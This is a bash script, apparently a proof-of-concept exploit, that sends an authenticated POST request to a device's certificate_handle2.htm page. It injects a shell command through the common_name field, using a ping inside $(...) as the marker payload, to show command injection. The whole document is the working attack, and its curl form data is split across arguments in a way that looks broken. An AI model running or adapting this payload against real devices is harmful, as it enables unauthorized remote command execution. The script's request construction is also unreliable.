#!/bin/bash

# Set the target IP address
target_ip="192.168.1.1"

# Set the target URL
target_url="http://$target_ip/certificate_handle2.htm?type=4"

# Set the common name payload
common_name="a'\$(ping -c 4 192.168.1.2)'b"

# Set the cookie value
cookie="YOUR_SESSION_COOKIE_VALUE"

# Send the HTTP POST request
curl -s -b "$cookie" \
--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30" \
"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A" \
"&organization=A&organization_unit=A&email=ab%40example.com" \
"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&" \
"SelectSubject_s=1" \
--data-urlencode "common_name=$common_name" \
"$target_url"
